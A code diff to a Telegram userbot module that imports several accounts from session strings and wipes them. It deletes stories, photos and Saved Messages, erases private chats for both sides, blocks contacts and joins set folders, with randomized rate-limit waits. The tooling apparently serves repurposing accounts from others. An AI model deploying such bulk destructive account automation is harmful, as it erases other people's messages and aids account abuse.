@@ -1,4 +1,4 @@
-__version__ = (1, 3, 0)
+__version__ = (1, 4, 0)
 # meta developer: FireJester.t.me
 
 import logging
@@ -6,6 +6,7 @@ import asyncio
 import re
 import time
 import io
+import random
 import aiohttp
 
 from datetime import datetime, timezone, timedelta
@@ -23,6 +24,7 @@ from telethon.tl.types import (
     TextWithEntities,
     InputPeerNotifySettings,
     InputPhoto,
+    InputPeerSelf,
 )
 from telethon.tl.functions.contacts import (
     GetContactsRequest,
@@ -65,8 +67,9 @@ STRING_SESSION_PATTERN = re.compile(r"(?<!\w)1[A-Za-z0-9_-]{200,}={0,2}(?!\w)")
 MAX_SESSIONS = 10
 TELEGRAM_ID = 777000
 SPAMBOT_USERNAME = "SpamBot"
-FLOOD_EXTRA_WAIT = 600
 MAX_PHOTO_ITERATIONS = 20
+FLOOD_EXTRA_MIN = 360
+FLOOD_EXTRA_MAX = 720
 
 
 def get_full_name(entity):
@@ -77,10 +80,23 @@ def get_full_name(entity):
     return f"{first} {last}".strip() or "Unknown"
 
 
+def get_owner_username(user_entity):
+    username = getattr(user_entity, "username", None)
+    if username:
+        return username
+    usernames_list = getattr(user_entity, "usernames", None)
+    if usernames_list:
+        for u in usernames_list:
+            if getattr(u, "active", False):
+                return u.username
+    return None
+
+
 class AccountFloodError(Exception):
-    def __init__(self, seconds):
+    def __init__(self, seconds, method="unknown"):
         self.seconds = seconds
-        super().__init__(f"Account flood wait {seconds}s")
+        self.method = method
+        super().__init__(f"Account flood wait {seconds}s in {method}")
 
 
 @loader.tds
@@ -96,7 +112,7 @@ class Manager(loader.Module):
             "<code>.manage add long [session]</code> - add persistent session\n"
             "<code>.manage list</code> - list connected sessions\n"
             "<code>.manage remove [number]</code> - remove session by number\n"
-            "<code>.manage folder [link]</code> - set folder link\n"
+            "<code>.manage folder [1/2/3] [link]</code> - set folder link\n"
             "<code>.manage ava [url]</code> - set avatar image url\n"
             "<code>.manage set [offset]</code> - set timezone (from -12 to 12)\n"
             "<code>.manage start</code> - start cleanup process\n"
@@ -131,9 +147,10 @@ class Manager(loader.Module):
         "error_no_api": (
             "<b>Error:</b> Set api_id and api_hash in module config first"
         ),
-        "folder_set": "<b>Folder link saved:</b>\n<code>{link}</code>",
-        "folder_cleared": "<b>Folder link cleared</b>",
-        "folder_provide": "<b>Error:</b> Provide folder link",
+        "folder_set": "<b>Folder link {num} saved:</b>\n<code>{link}</code>",
+        "folder_cleared": "<b>Folder link {num} cleared</b>",
+        "folder_provide": "<b>Error:</b> Provide folder number (1-3) and link",
+        "folder_invalid_num": "<b>Error:</b> Folder number must be 1, 2 or 3",
         "ava_set": "<b>Avatar URL saved:</b>\n<code>{url}</code>",
         "ava_cleared": "<b>Avatar URL cleared</b>",
         "ava_provide": "<b>Error:</b> Provide image URL",
@@ -162,9 +179,21 @@ class Manager(loader.Module):
                 validator=loader.validators.Hidden(loader.validators.Series()),
             ),
             loader.ConfigValue(
-                "folder_link",
+                "folder_link_1",
                 "",
-                "Chatlist folder invite link",
+                "Chatlist folder invite link #1",
+                validator=loader.validators.Hidden(loader.validators.String()),
+            ),
+            loader.ConfigValue(
+                "folder_link_2",
+                "",
+                "Chatlist folder invite link #2",
+                validator=loader.validators.Hidden(loader.validators.String()),
+            ),
+            loader.ConfigValue(
+                "folder_link_3",
+                "",
+                "Chatlist folder invite link #3",
                 validator=loader.validators.Hidden(loader.validators.String()),
             ),
             loader.ConfigValue(
@@ -185,11 +214,18 @@ class Manager(loader.Module):
         self._status_msg = None
         self._processing_lock = asyncio.Lock()
         self._flood_until = {}
+        self._flood_log = []
 
     def _get_timezone_str(self, offset):
         if offset >= 0:
             return f"+{offset}"
         return str(offset)
+
+    def _get_now_formatted(self):
+        offset = self.config["timezone_offset"]
+        tz = timezone(timedelta(hours=offset))
+        now = datetime.now(tz)
+        return now.strftime("%d.%m.%Y %H:%M")
 
     def _get_resume_time_str(self, wait_seconds):
         offset = self.config["timezone_offset"]
@@ -203,6 +239,12 @@ class Manager(loader.Module):
         tz = timezone(timedelta(hours=offset))
         dt = datetime.fromtimestamp(ts, tz=tz)
         return dt.strftime("%H:%M:%S")
+
+    def _get_datetime_str_from_timestamp(self, ts):
+        offset = self.config["timezone_offset"]
+        tz = timezone(timedelta(hours=offset))
+        dt = datetime.fromtimestamp(ts, tz=tz)
+        return dt.strftime("%d.%m.%Y %H:%M:%S")
 
     async def client_ready(self, client, db):
         self._client = client
@@ -230,12 +272,26 @@ class Manager(loader.Module):
         if not client.is_connected():
             await client.connect()
 
-    def _mark_flood(self, client, seconds):
-        resume_at = time.time() + seconds + FLOOD_EXTRA_WAIT
+    def _mark_flood(self, client, seconds, method="unknown", account_name="unknown"):
+        extra = random.randint(FLOOD_EXTRA_MIN, FLOOD_EXTRA_MAX)
+        total = seconds + extra
+        resume_at = time.time() + total
         self._flood_until[id(client)] = resume_at
+
+        flood_entry = {
+            "account": account_name,
+            "method": method,
+            "flood_seconds": seconds,
+            "extra_wait": extra,
+            "total_wait": total,
+            "timestamp": self._get_datetime_str_from_timestamp(time.time()),
+            "resume_at": self._get_datetime_str_from_timestamp(resume_at),
+        }
+        self._flood_log.append(flood_entry)
+
         logger.warning(
-            f"[MANAGER] Client {id(client)} flood until "
-            f"{self._get_time_str_from_timestamp(resume_at)}"
+            f"[MANAGER] Client {account_name} flood {seconds}s + {extra}s extra "
+            f"in {method}, resume at {self._get_time_str_from_timestamp(resume_at)}"
         )
 
     def _is_flooded(self, client):
@@ -278,14 +334,14 @@ class Manager(loader.Module):
         except Exception:
             pass
 
-    async def _safe_request(self, client, request, context="", max_retries=3):
+    async def _safe_request(self, client, request, context="", max_retries=3, account_name="unknown"):
         for attempt in range(max_retries):
             try:
                 await self._ensure_connected(client)
                 return await client(request)
             except FloodWaitError as e:
-                self._mark_flood(client, e.seconds)
-                raise AccountFloodError(e.seconds)
+                self._mark_flood(client, e.seconds, method=context, account_name=account_name)
+                raise AccountFloodError(e.seconds, method=context)
             except (ConnectionError, OSError) as e:
                 logger.warning(
                     f"[MANAGER] Connection error in {context} "
@@ -416,10 +472,19 @@ class Manager(loader.Module):
             return peer.user_id
         return None
 
-    async def _get_existing_folder_ids(self, client):
+    def _get_folder_links(self):
+        links = []
+        for key in ("folder_link_1", "folder_link_2", "folder_link_3"):
+            val = self.config[key]
+            if val and val.strip():
+                links.append(val.strip())
+        return links
+
+    async def _get_existing_folder_ids(self, client, account_name="unknown"):
         try:
             result = await self._safe_request(
-                client, GetDialogFiltersRequest(), context="GetDialogFilters"
+                client, GetDialogFiltersRequest(), context="GetDialogFilters",
+                account_name=account_name,
             )
             filters = getattr(result, "filters", result)
             used_ids = set()
@@ -499,7 +564,7 @@ class Manager(loader.Module):
         fields.update(overrides)
         return DialogFilter(**fields)
 
-    async def _update_existing_folder(self, client, folder, new_entities):
+    async def _update_existing_folder(self, client, folder, new_entities, account_name="unknown"):
         try:
             existing_ids = set()
             for peer in folder.include_peers:
@@ -526,13 +591,14 @@ class Manager(loader.Module):
                 client,
                 UpdateDialogFilterRequest(id=folder.id, filter=updated),
                 context="UpdateDialogFilter",
+                account_name=account_name,
             )
             return True, added
         except Exception as e:
             logger.error(f"[MANAGER] Update folder error: {e}")
             return False, []
 
-    async def _create_folder(self, client, folder_id, title, peers):
+    async def _create_folder(self, client, folder_id, title, peers, account_name="unknown"):
         try:
             input_peers = []
             for peer in peers:
@@ -553,15 +619,25 @@ class Manager(loader.Module):
                 client,
                 UpdateDialogFilterRequest(id=folder_id, filter=dialog_filter),
                 context="CreateFolder",
+                account_name=account_name,
             )
             return True
         except Exception as e:
             logger.error(f"[MANAGER] Create folder '{title}' error: {e}")
             return False
 
-    async def _remove_saved_from_all_folders(self, client, me_id):
+    async def _remove_saved_from_all_folders(self, client, me_id, account_name="unknown"):
         try:
-            _, filters = await self._get_existing_folder_ids(client)
+            _, filters = await self._get_existing_folder_ids(client, account_name=account_name)
+
+            await self._ensure_connected(client)
+            try:
+                me_input = await client.get_input_entity(InputPeerSelf())
+            except Exception:
+                me_input = await client.get_input_entity(me_id)
+
+            me_peer_id = me_id
+
             for f in filters:
                 if not isinstance(f, DialogFilter):
                     continue
@@ -570,14 +646,16 @@ class Manager(loader.Module):
                 has_saved = False
                 new_include = []
                 for peer in f.include_peers:
-                    if self._get_peer_id(peer) == me_id:
+                    pid = self._get_peer_id(peer)
+                    if pid == me_peer_id:
                         has_saved = True
                     else:
                         new_include.append(peer)
                 new_pinned = []
                 if hasattr(f, "pinned_peers") and f.pinned_peers:
                     for peer in f.pinned_peers:
-                        if self._get_peer_id(peer) == me_id:
+                        pid = self._get_peer_id(peer)
+                        if pid == me_peer_id:
                             has_saved = True
                         else:
                             new_pinned.append(peer)
@@ -591,7 +669,11 @@ class Manager(loader.Module):
                         await self._safe_request(
                             client,
                             UpdateDialogFilterRequest(id=f.id, filter=updated),
-                            context="RemoveSavedFromFolder",
+                            context=f"RemoveSavedFromFolder_{f.id}",
+                            account_name=account_name,
+                        )
+                        logger.info(
+                            f"[MANAGER] Removed Saved Messages from folder {f.id}"
                         )
                     except Exception as e:
                         logger.warning(
@@ -601,6 +683,78 @@ class Manager(loader.Module):
         except Exception as e:
             logger.error(f"[MANAGER] Remove saved from folders error: {e}")
             return False
+
+    async def _clear_saved_messages(self, client, me, account_name="unknown"):
+        errors = []
+        try:
+            await self._ensure_connected(client)
+            await client(DeleteHistoryRequest(
+                peer=InputPeerSelf(),
+                max_id=0,
+                just_clear=True,
+                revoke=False,
+            ))
+            logger.info(f"[MANAGER] Cleared Saved Messages for {account_name}")
+        except Exception as e:
+            errors.append(f"Clear saved messages history: {e}")
+
+        try:
+            now_str = self._get_now_formatted()
+            await self._ensure_connected(client)
+            await client.send_message("me", f"successfully cleared ({now_str})")
+            logger.info(f"[MANAGER] Sent clear confirmation to Saved Messages for {account_name}")
+        except Exception as e:
+            errors.append(f"Send clear confirmation: {e}")
+
+        return errors
+
+    async def _match_owner(self, client, me, account_name="unknown"):
+        errors = []
+        try:
+            owner_entity = self._me
+            owner_username = get_owner_username(owner_entity)
+
+            if not owner_username:
+                errors.append("Owner has no username, cannot match")
+                return False, errors
+
+            await self._ensure_connected(client)
+            try:
+                resolved = await client.get_entity(owner_username)
+            except Exception as e:
+                errors.append(f"Failed to resolve owner @{owner_username}: {e}")
+                return False, errors
+
+            try:
+                await self._ensure_connected(client)
+                await client.send_message(resolved, "successfully matched owner")
+                logger.info(
+                    f"[MANAGER] {account_name} sent match message to owner @{owner_username}"
+                )
+            except Exception as e:
+                errors.append(f"Failed to send match message to owner: {e}")
+                return False, errors
+
+            await asyncio.sleep(3)
+
+            try:
+                await self._client(DeleteHistoryRequest(
+                    peer=me.id,
+                    max_id=0,
+                    just_clear=True,
+                    revoke=False,
+                ))
+                logger.info(
+                    f"[MANAGER] Owner cleared chat with {account_name} (ID: {me.id})"
+                )
+            except Exception as e:
+                errors.append(f"Owner failed to clear chat with account: {e}")
+
+            return True, errors
+
+        except Exception as e:
+            errors.append(f"Match owner error: {e}")
+            return False, errors
 
     async def _get_spambot_id(self, client):
         try:
@@ -633,7 +787,21 @@ class Manager(loader.Module):
             logger.error(f"[MANAGER] Get admin chats error: {e}")
         return channels, groups
 
-    async def _mute_peer(self, client, peer, context=""):
+    async def _is_peer_muted(self, client, peer):
+        try:
+            await self._ensure_connected(client)
+            full = await client(functions.account.GetNotifySettingsRequest(peer=peer))
+            mute_until = getattr(full, "mute_until", None)
+            if mute_until and mute_until > int(time.time()):
+                return True
+            silent = getattr(full, "silent", None)
+            if silent:
+                return True
+            return False
+        except Exception:
+            return False
+
+    async def _mute_peer(self, client, peer, context="", account_name="unknown"):
         await self._safe_request(
             client,
             UpdateNotifySettingsRequest(
@@ -645,21 +813,33 @@ class Manager(loader.Module):
                 ),
             ),
             context=context,
+            account_name=account_name,
         )
 
-    async def _mute_and_archive(self, client, peer):
+    async def _mute_and_archive(self, client, peer, dialog=None, account_name="unknown"):
         try:
-            await self._ensure_connected(client)
-            await self._mute_peer(client, peer, context="MuteAndArchive")
-            await asyncio.sleep(0.3)
+            is_archived = False
+            if dialog is not None:
+                is_archived = getattr(dialog, "archived", False)
+
+            if is_archived:
+                return True
+
+            already_muted = await self._is_peer_muted(client, peer)
+
+            if not already_muted:
+                await self._ensure_connected(client)
+                await self._mute_peer(client, peer, context="MuteAndArchive", account_name=account_name)
+                await asyncio.sleep(0.5)
+
             await self._ensure_connected(client)
             await client.edit_folder(peer, 1)
             return True
         except AccountFloodError:
             raise
         except FloodWaitError as e:
-            self._mark_flood(client, e.seconds)
-            raise AccountFloodError(e.seconds)
+            self._mark_flood(client, e.seconds, method="mute_and_archive", account_name=account_name)
+            raise AccountFloodError(e.seconds, method="mute_and_archive")
         except (ConnectionError, OSError) as e:
             logger.warning(f"[MANAGER] Connection lost in mute_and_archive: {e}")
             await asyncio.sleep(2)
@@ -668,15 +848,15 @@ class Manager(loader.Module):
                 await client.edit_folder(peer, 1)
                 return True
             except FloodWaitError as e2:
-                self._mark_flood(client, e2.seconds)
-                raise AccountFloodError(e2.seconds)
+                self._mark_flood(client, e2.seconds, method="mute_and_archive_retry", account_name=account_name)
+                raise AccountFloodError(e2.seconds, method="mute_and_archive_retry")
             except Exception:
                 return False
         except Exception as e:
             logger.error(f"[MANAGER] Mute/archive error: {e}")
             return False
 
-    async def _archive_all_except(self, client, excluded_ids):
+    async def _archive_all_except(self, client, excluded_ids, account_name="unknown"):
         archived = []
         errors = []
         try:
@@ -689,8 +869,15 @@ class Manager(loader.Module):
                     continue
                 if isinstance(entity, (ChannelForbidden, ChatForbidden)):
                     continue
+
+                is_archived = getattr(dialog, "archived", False)
+                if is_archived:
+                    continue
+
                 try:
-                    success = await self._mute_and_archive(client, entity)
+                    success = await self._mute_and_archive(
+                        client, entity, dialog=dialog, account_name=account_name
+                    )
                     name = (
                         get_full_name(entity)
                         if isinstance(entity, (User, Channel, Chat))
@@ -704,14 +891,47 @@ class Manager(loader.Module):
                     raise
                 except Exception as e:
                     errors.append(f"Archive {eid}: {e}")
-                await asyncio.sleep(0.3)
+                await asyncio.sleep(0.5)
         except AccountFloodError:
             raise
         except Exception as e:
             errors.append(f"Archive iteration: {e}")
         return archived, errors
 
-    async def _pin_and_order_chats(self, client, me_id, owner_id, spambot_id):
+    async def _ensure_archive_muted(self, client, excluded_ids, account_name="unknown"):
+        muted_count = 0
+        errors = []
+        try:
+            await self._ensure_connected(client)
+            dialogs = await client.get_dialogs(folder=1)
+            for dialog in dialogs:
+                entity = dialog.entity
+                eid = getattr(entity, "id", None)
+                if eid and eid in excluded_ids:
+                    continue
+                if isinstance(entity, (ChannelForbidden, ChatForbidden)):
+                    continue
+                try:
+                    already_muted = await self._is_peer_muted(client, entity)
+                    if not already_muted:
+                        await self._mute_peer(
+                            client, entity,
+                            context=f"EnsureArchiveMute_{eid}",
+                            account_name=account_name,
+                        )
+                        muted_count += 1
+                        await asyncio.sleep(0.5)
+                except AccountFloodError:
+                    raise
+                except Exception as e:
+                    errors.append(f"Ensure mute {eid}: {e}")
+        except AccountFloodError:
+            raise
+        except Exception as e:
+            errors.append(f"Ensure archive muted iteration: {e}")
+        return muted_count, errors
+
+    async def _pin_and_order_chats(self, client, me_id, owner_id, spambot_id, account_name="unknown"):
         errors = []
         pin_order = [TELEGRAM_ID]
         if spambot_id:
@@ -724,16 +944,29 @@ class Manager(loader.Module):
             try:
                 await self._ensure_connected(client)
                 inp = await client.get_input_entity(uid)
-                await self._safe_request(
-                    client,
-                    ToggleDialogPinRequest(peer=inp, pinned=True),
-                    context=f"PinDialog_{uid}",
-                )
+
+                already_pinned = False
+                try:
+                    dialogs = await client.get_dialogs(limit=20)
+                    for d in dialogs:
+                        if getattr(d.entity, "id", None) == uid and d.pinned:
+                            already_pinned = True
+                            break
+                except Exception:
+                    pass
+
+                if not already_pinned:
+                    await self._safe_request(
+                        client,
+                        ToggleDialogPinRequest(peer=inp, pinned=True),
+                        context=f"PinDialog_{uid}",
+                        account_name=account_name,
+                    )
             except AccountFloodError:
                 raise
             except Exception as e:
                 errors.append(f"Pin {uid}: {e}")
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.5)
 
         try:
             order_peers = []
@@ -751,6 +984,7 @@ class Manager(loader.Module):
                         folder_id=0, order=order_peers, force=True
                     ),
                     context="ReorderPinnedDialogs",
+                    account_name=account_name,
                 )
         except AccountFloodError:
             raise
@@ -758,7 +992,7 @@ class Manager(loader.Module):
             errors.append(f"Reorder pins: {e}")
         return errors
 
-    async def _get_all_stories(self, client, func, **kwargs):
+    async def _get_all_stories(self, client, func, account_name="unknown", **kwargs):
         stories = []
         offset_id = 0
         while True:
@@ -770,7 +1004,8 @@ class Manager(loader.Module):
                     **kwargs,
                 )
                 result = await self._safe_request(
-                    client, request, context="GetStories"
+                    client, request, context="GetStories",
+                    account_name=account_name,
                 )
             except Exception:
                 break
@@ -782,7 +1017,7 @@ class Manager(loader.Module):
                 break
         return stories
 
-    async def _get_album_stories(self, client, album_id):
+    async def _get_album_stories(self, client, album_id, account_name="unknown"):
         stories = []
         offset = 0
         while True:
@@ -796,6 +1031,7 @@ class Manager(loader.Module):
                         limit=100,
                     ),
                     context=f"GetAlbumStories_{album_id}",
+                    account_name=account_name,
                 )
             except Exception:
                 break
@@ -807,7 +1043,7 @@ class Manager(loader.Module):
                 break
         return stories
 
-    async def _get_albums(self, client):
+    async def _get_albums(self, client, account_name="unknown"):
         try:
             result = await self._safe_request(
                 client,
@@ -815,22 +1051,23 @@ class Manager(loader.Module):
                     peer=types.InputPeerSelf(), hash=0
                 ),
                 context="GetAlbums",
+                account_name=account_name,
             )
             return getattr(result, "albums", [])
         except Exception:
             return []
 
-    async def _delete_all_stories_and_albums(self, client):
+    async def _delete_all_stories_and_albums(self, client, account_name="unknown"):
         deleted_albums = []
         deleted_stories_count = 0
         errors = []
 
         try:
-            albums = await self._get_albums(client)
+            albums = await self._get_albums(client, account_name=account_name)
             for album in albums:
                 try:
                     album_stories = await self._get_album_stories(
-                        client, album.album_id
+                        client, album.album_id, account_name=account_name
                     )
                     for s in album_stories:
                         try:
@@ -840,6 +1077,7 @@ class Manager(loader.Module):
                                     peer=types.InputPeerSelf(), id=[s.id]
                                 ),
                                 context=f"DeleteStory_{s.id}",
+                                account_name=account_name,
                             )
                             deleted_stories_count += 1
                             await asyncio.sleep(0.3)
@@ -858,6 +1096,7 @@ class Manager(loader.Module):
                                 album_id=album.album_id,
                             ),
                             context=f"DeleteAlbum_{album.title}",
+                            account_name=account_name,
                         )
                         deleted_albums.append(
                             f"{album.title} ({len(album_stories)} stories)"
@@ -879,7 +1118,8 @@ class Manager(loader.Module):
 
         try:
             active = await self._get_all_stories(
-                client, functions.stories.GetPinnedStoriesRequest
+                client, functions.stories.GetPinnedStoriesRequest,
+                account_name=account_name,
             )
             for s in active:
                 try:
@@ -889,6 +1129,7 @@ class Manager(loader.Module):
                             peer=types.InputPeerSelf(), id=[s.id]
                         ),
                         context=f"DeleteActiveStory_{s.id}",
+                        account_name=account_name,
                     )
                     deleted_stories_count += 1
                     await asyncio.sleep(0.3)
@@ -903,7 +1144,8 @@ class Manager(loader.Module):
 
         try:
             archive = await self._get_all_stories(
-                client, functions.stories.GetStoriesArchiveRequest
+                client, functions.stories.GetStoriesArchiveRequest,
+                account_name=account_name,
             )
             for s in archive:
                 try:
@@ -913,6 +1155,7 @@ class Manager(loader.Module):
                             peer=types.InputPeerSelf(), id=[s.id]
                         ),
                         context=f"DeleteArchiveStory_{s.id}",
+                        account_name=account_name,
                     )
                     deleted_stories_count += 1
                     await asyncio.sleep(0.3)
@@ -927,7 +1170,7 @@ class Manager(loader.Module):
 
         return deleted_albums, deleted_stories_count, errors
 
-    async def _delete_all_profile_photos(self, client, me):
+    async def _delete_all_profile_photos(self, client, me, account_name="unknown"):
         deleted_count = 0
         errors = []
         try:
@@ -940,6 +1183,7 @@ class Manager(loader.Module):
                         user_id=me, offset=0, max_id=0, limit=100
                     ),
                     context="GetUserPhotos",
+                    account_name=account_name,
                 )
                 if not result.photos:
                     break
@@ -957,6 +1201,7 @@ class Manager(loader.Module):
                         client,
                         DeletePhotosRequest(id=input_photos),
                         context="DeletePhotos",
+                        account_name=account_name,
                     )
                     batch_deleted = len(input_photos)
                     deleted_count += batch_deleted
@@ -970,6 +1215,7 @@ class Manager(loader.Module):
                                 client,
                                 DeletePhotosRequest(id=[inp]),
                                 context=f"DeletePhoto_{inp.id}",
+                                account_name=account_name,
                             )
                             deleted_count += 1
                             batch_deleted += 1
@@ -989,7 +1235,7 @@ class Manager(loader.Module):
             errors.append(f"Get photos: {e}")
         return deleted_count, errors
 
-    async def _set_avatar(self, client, url):
+    async def _set_avatar(self, client, url, account_name="unknown"):
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(url) as resp:
@@ -1006,6 +1252,7 @@ class Manager(loader.Module):
                 client,
                 UploadProfilePhotoRequest(file=uploaded),
                 context="UploadProfilePhoto",
+                account_name=account_name,
             )
             return True, None
         except AccountFloodError:
@@ -1014,7 +1261,7 @@ class Manager(loader.Module):
             logger.error(f"[MANAGER] Set avatar error: {e}")
             return False, str(e)
 
-    async def _join_folder(self, client, folder_link):
+    async def _join_folder(self, client, folder_link, account_name="unknown"):
         folder_hash = self._extract_folder_hash(folder_link)
         if not folder_hash:
             return False, "Invalid folder link format", []
@@ -1024,12 +1271,14 @@ class Manager(loader.Module):
                 client,
                 CheckChatlistInviteRequest(slug=folder_hash),
                 context="CheckChatlistInvite",
+                account_name=account_name,
             )
             peers = list(check.peers)
             await self._safe_request(
                 client,
                 JoinChatlistInviteRequest(slug=folder_hash, peers=peers),
                 context="JoinChatlistInvite",
+                account_name=account_name,
             )
             for p in peers:
                 pid = self._get_peer_id(p)
@@ -1045,6 +1294,7 @@ class Manager(loader.Module):
                         client,
                         JoinChatlistInviteRequest(slug=folder_hash, peers=[]),
                         context="JoinChatlistInvite_refresh",
+                        account_name=account_name,
                     )
                     return True, "Already joined, refreshed", []
                 except AccountFloodError:
@@ -1053,17 +1303,22 @@ class Manager(loader.Module):
                     return False, str(e2), []
             return False, str(e), []
 
-    async def _mute_folder_chats(self, client, peer_ids):
+    async def _mute_folder_chats(self, client, peer_ids, account_name="unknown"):
         muted = []
         errors = []
         for pid in peer_ids:
             try:
                 await self._ensure_connected(client)
                 entity = await client.get_entity(pid)
-                await self._mute_peer(
-                    client, entity, context=f"MuteFolderChat_{pid}"
-                )
-                await asyncio.sleep(0.3)
+
+                already_muted = await self._is_peer_muted(client, entity)
+                if not already_muted:
+                    await self._mute_peer(
+                        client, entity, context=f"MuteFolderChat_{pid}",
+                        account_name=account_name,
+                    )
+                    await asyncio.sleep(0.3)
+
                 await self._ensure_connected(client)
                 await client.edit_folder(entity, 1)
                 name = (
@@ -1072,17 +1327,17 @@ class Manager(loader.Module):
                     else str(pid)
                 )
                 muted.append(f"{name} (ID: {pid})")
-                await asyncio.sleep(0.3)
+                await asyncio.sleep(0.5)
             except AccountFloodError:
                 raise
             except FloodWaitError as e:
-                self._mark_flood(client, e.seconds)
-                raise AccountFloodError(e.seconds)
+                self._mark_flood(client, e.seconds, method="mute_folder_chats", account_name=account_name)
+                raise AccountFloodError(e.seconds, method="mute_folder_chats")
             except Exception as e:
                 errors.append(f"Mute folder chat {pid}: {e}")
         return muted, errors
 
-    async def _process_account(self, client, me):
+    async def _process_account(self, client, me, account_name="unknown"):
         summary = []
         detailed = []
         owner_id = self._me.id
@@ -1095,8 +1350,19 @@ class Manager(loader.Module):
         acc_name = get_full_name(me)
         detailed.append(f"=== Account: {acc_name} (ID: {me.id}) ===\n")
 
+        # Step 0: Match owner
+        match_ok, match_err = await self._match_owner(client, me, account_name=account_name)
+        summary.append(f"Match owner: {'Done' if match_ok else 'Error'}")
+        detailed.append("\n--- Match owner ---")
+        if match_ok:
+            detailed.append(f"  Matched owner successfully (ID: {owner_id})")
+        if match_err:
+            for e in match_err:
+                detailed.append(f"  {e}")
+
+        # Step 1: Delete stories & albums
         del_albums, del_stories, st_err = await self._delete_all_stories_and_albums(
-            client
+            client, account_name=account_name
         )
         summary.append(f"Albums deleted: {len(del_albums)}")
         summary.append(f"Stories deleted: {del_stories}")
@@ -1109,7 +1375,8 @@ class Manager(loader.Module):
             for e in st_err:
                 detailed.append(f"  {e}")
 
-        ph_del, ph_err = await self._delete_all_profile_photos(client, me)
+        # Step 2: Delete profile photos
+        ph_del, ph_err = await self._delete_all_profile_photos(client, me, account_name=account_name)
         summary.append(f"Profile photos deleted: {ph_del}")
         detailed.append(f"\n--- Profile photos deleted: {ph_del} ---")
         if ph_err:
@@ -1117,43 +1384,40 @@ class Manager(loader.Module):
             for e in ph_err:
                 detailed.append(f"  {e}")
 
-        folder_link = self.config["folder_link"]
-        folder_peers = []
-        if folder_link:
-            ok, err, folder_peers = await self._join_folder(client, folder_link)
-            summary.append(f"Join folder: {'Done' if ok else 'Error'}")
-            detailed.append("\n--- Join folder ---")
-            if ok:
-                detailed.append(f"  {err or 'Joined successfully'}: {folder_link}")
-                detailed.append(f"  Chats joined: {len(folder_peers)}")
-            else:
-                detailed.append(f"  Error: {err}")
+        # Step 3: Join folders (1, 2, 3)
+        folder_links = self._get_folder_links()
+        all_folder_peers = []
+        if folder_links:
+            for fi, folder_link in enumerate(folder_links, 1):
+                ok, err, folder_peers = await self._join_folder(
+                    client, folder_link, account_name=account_name
+                )
+                all_folder_peers.extend(folder_peers)
+                summary.append(f"Join folder #{fi}: {'Done' if ok else 'Error'}")
+                detailed.append(f"\n--- Join folder #{fi} ---")
+                if ok:
+                    detailed.append(f"  {err or 'Joined successfully'}: {folder_link}")
+                    detailed.append(f"  Chats joined: {len(folder_peers)}")
+                else:
+                    detailed.append(f"  Error: {err}")
+                if fi < len(folder_links):
+                    await asyncio.sleep(10)
         else:
-            summary.append("Join folder: Skipped (no link)")
-            detailed.append("\n--- Join folder: Skipped ---")
+            summary.append("Join folders: Skipped (no links)")
+            detailed.append("\n--- Join folders: Skipped ---")
 
-        if folder_peers:
-            m_ok, m_err = await self._mute_folder_chats(client, folder_peers)
-            summary.append(f"Folder chats muted+archived: {len(m_ok)}")
-            detailed.append(
-                f"\n--- Folder chats muted & archived ({len(m_ok)}) ---"
-            )
-            for m in m_ok:
-                detailed.append(f"  {m}")
-            if m_err:
-                detailed.append("\n--- Folder mute Errors ---")
-                for e in m_err:
-                    detailed.append(f"  {e}")
-
+        # Step 4: Create/update admin folders (channels, groups) — BEFORE mute+archive
         channels, groups = await self._get_admin_chats(client)
-        used_ids, existing_filters = await self._get_existing_folder_ids(client)
+        used_ids, existing_filters = await self._get_existing_folder_ids(
+            client, account_name=account_name
+        )
 
         for label, entities in (("channels", channels), ("groups", groups)):
             existing = self._find_folder_by_title(existing_filters, label)
             if existing:
                 if entities:
                     ok, added = await self._update_existing_folder(
-                        client, existing, entities
+                        client, existing, entities, account_name=account_name
                     )
                     summary.append(
                         f"Folder '{label}' update: {'Done' if ok else 'Error'}"
@@ -1173,7 +1437,9 @@ class Manager(loader.Module):
             else:
                 fid = self._get_free_folder_id(used_ids)
                 if fid and entities:
-                    ok = await self._create_folder(client, fid, label, entities)
+                    ok = await self._create_folder(
+                        client, fid, label, entities, account_name=account_name
+                    )
                     used_ids.add(fid)
                     summary.append(
                         f"Folder '{label}' create: {'Done' if ok else 'Error'}"
@@ -1194,16 +1460,48 @@ class Manager(loader.Module):
                     summary.append(f"Folder '{label}': no free folder ID")
                     detailed.append(f"\n--- Folder '{label}': no free folder ID ---")
 
+        # Step 5: Mute + archive folder chats — AFTER creating folders
+        if all_folder_peers:
+            m_ok, m_err = await self._mute_folder_chats(
+                client, all_folder_peers, account_name=account_name
+            )
+            summary.append(f"Folder chats muted+archived: {len(m_ok)}")
+            detailed.append(
+                f"\n--- Folder chats muted & archived ({len(m_ok)}) ---"
+            )
+            for m in m_ok:
+                detailed.append(f"  {m}")
+            if m_err:
+                detailed.append("\n--- Folder mute Errors ---")
+                for e in m_err:
+                    detailed.append(f"  {e}")
+
+        # Step 6: Remove Saved Messages from all folders
         await asyncio.sleep(0.5)
-        sv_ok = await self._remove_saved_from_all_folders(client, me.id)
+        sv_ok = await self._remove_saved_from_all_folders(
+            client, me.id, account_name=account_name
+        )
         summary.append(f"Remove 'Saved' from folders: {'Done' if sv_ok else 'Error'}")
         detailed.append(
             f"\n--- Remove 'Saved' from folders: {'Done' if sv_ok else 'Error'} ---"
         )
 
+        # Step 7: Clear Saved Messages + send confirmation
+        sv_clear_err = await self._clear_saved_messages(
+            client, me, account_name=account_name
+        )
+        summary.append(f"Clear Saved Messages: {'Done' if not sv_clear_err else 'Partial'}")
+        detailed.append("\n--- Clear Saved Messages ---")
+        if sv_clear_err:
+            for e in sv_clear_err:
+                detailed.append(f"  {e}")
+        else:
+            detailed.append("  Cleared and confirmation sent")
+
+        # Step 8: Delete PMs + block users
         blocked = []
         deleted_pm = []
-        s6_err = []
+        s8_err = []
         try:
             await self._ensure_connected(client)
             dialogs = await client.get_dialogs()
@@ -1219,26 +1517,28 @@ class Manager(loader.Module):
                         client,
                         DeleteHistoryRequest(peer=ent, max_id=0, revoke=True),
                         context=f"DeleteHistory_{uid}",
+                        account_name=account_name,
                     )
                     deleted_pm.append(f"{get_full_name(ent)} (ID: {uid})")
                 except AccountFloodError:
                     raise
                 except Exception as e:
-                    s6_err.append(f"Delete history {uid}: {e}")
+                    s8_err.append(f"Delete history {uid}: {e}")
                 try:
                     await self._safe_request(
-                        client, BlockRequest(id=ent), context=f"Block_{uid}"
+                        client, BlockRequest(id=ent), context=f"Block_{uid}",
+                        account_name=account_name,
                     )
